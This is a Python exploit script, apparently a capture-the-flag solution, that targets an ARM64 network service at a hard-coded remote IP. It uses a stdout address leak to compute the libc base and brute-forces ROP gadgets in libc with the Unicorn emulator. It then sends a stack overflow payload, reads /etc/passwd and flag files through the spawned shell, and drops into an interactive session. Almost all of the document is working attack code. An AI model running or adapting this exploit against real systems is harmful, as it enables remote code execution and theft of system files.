#!/usr/bin/python
import random
import sys
import socket
import telnetlib
import os
import time
import threading
from struct import pack, unpack
from time import time

from unicorn import *
from unicorn.arm64_const import *

def recvuntil(sock, txt):
  d = ""
  while d.find(txt) == -1:
    try:
      dnow = sock.recv(1)
      if len(dnow) == 0:
        return ("DISCONNECTED", d)
    except socket.timeout:
      return ("TIMEOUT", d)
    except socket.error as msg:
      return ("ERROR", d)
    d += dnow
  return ("OK", d)

def recvall(sock, n):
  d = ""
  while len(d) != n:
    try:
      dnow = sock.recv(n - len(d))
      if len(dnow) == 0:
        return ("DISCONNECTED", d)
    except socket.timeout:
      return ("TIMEOUT", d)
    except socket.error as msg:
      return ("ERROR", d)
    d += dnow
  return ("OK", d)

# Proxy object for sockets.
class gsocket(object):
  def __init__(self, *p):
    self._sock = socket.socket(*p)

  def __getattr__(self, name):
    return getattr(self._sock, name)

  def recvall(self, n):
    err, ret = recvall(self._sock, n)
    if err != "OK":
      return False
    return ret

  def recvuntil(self, txt):
    err, ret = recvuntil(self._sock, txt)
    if err != "OK":
      return False
    return ret

# Base for any of my ROPs.
def db(v):
  return pack("<B", v)

def dw(v):
  return pack("<H", v)

def dd(v):
  return pack("<I", v)

def dq(v):
  return pack("<Q", v)

def rb(v):
  return unpack("<B", v[0])[0]

def rw(v):
  return unpack("<H", v[:2])[0]

def rd(v):
  return unpack("<I", v[:4])[0]

def rq(v):
  return unpack("<Q", v[:8])[0]

def go(rop2):
  global HOST
  global PORT
  s = gsocket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((HOST, PORT))

  ln = s.recvuntil('\n')
  #print ln
  stdout_addr = int(ln.strip()[2:], 16)
  LIBC = stdout_addr - 0x154560

  print "LIBC: %x" % LIBC

  GADGET1 = LIBC + rop2
  GADGET2 = LIBC + 0x063E90

  data = ''.join([
    "A" * 0x20,
    dq(GADGET1),
    dq(GADGET2)
  ])

  s.sendall(data + "\n")
  s.sendall("cat /etc/passwd; cat *la*; cat /*la*; cat /home/*/*ag*\n")

  # Put your code here!

  # Interactive sockets.
  t = telnetlib.Telnet()
  t.sock = s
  t.interact()

  # Python console.
  # Note: you might need to modify ReceiverClass if you want
  #       to parse incoming packets.
  #ReceiverClass(s).start()
  #dct = locals()
  #for k in globals().keys():
  #  if k not in dct:
  #    dct[k] = globals()[k]
  #code.InteractiveConsole(dct).interact()

  #s.shutdown(socket.SHUT_RDWR)  # SD_...
  s.close()


def find_me_a_gadget():
  libc = open("libc.so.6", "rb").read()

  LIBC_ADDR = 0x1000000
  STACK_ADDR = 0x10000

  RET_ADDR = 0x40000

  start = 0x20380  #77058
  start = 0x77058
  for gadget in xrange(start, 0x0110BA4, 4):
    if gadget % 1234 == 0:
      print "%x\r" % gadget
      sys.stdout.flush()

    uc = Uc(UC_ARCH_ARM64, UC_MODE_ARM)

    uc.mem_map(LIBC_ADDR, 2 * 1024 * 1024)
    uc.mem_write(LIBC_ADDR, libc)

    uc.mem_map(STACK_ADDR, 0x3000)
    uc.mem_write(STACK_ADDR, os.urandom(0x3000))

    uc.mem_map(RET_ADDR, 0x1000)

    for reg in xrange(UC_ARM64_REG_X0, UC_ARM64_REG_X28 + 3):
      r = random.randint(0, 0xffffffffffffffff)
      uc.reg_write(reg, r)

    uc.reg_write(UC_ARM64_REG_X25, LIBC_ADDR + gadget)
    uc.reg_write(UC_ARM64_REG_X26, LIBC_ADDR + 0x063E90)

    uc.reg_write(UC_ARM64_REG_LR, RET_ADDR)

    try:
      uc.emu_start(LIBC_ADDR + gadget, RET_ADDR, 10)
    except unicorn.UcError:
      continue

    pc = uc.reg_read(UC_ARM64_REG_PC)
    x1 = uc.reg_read(UC_ARM64_REG_X1)
    x2 = uc.reg_read(UC_ARM64_REG_X2)

    if pc == RET_ADDR and x1 == 0 and x2 == 0:
      print "-" * 50
      print "GADGET: %x" % gadget
      print "-" * 50
      go(gadget)





HOST = '127.0.0.1'
HOST = '13.230.48.252'
PORT = 4869
#go()

find_me_a_gadget()

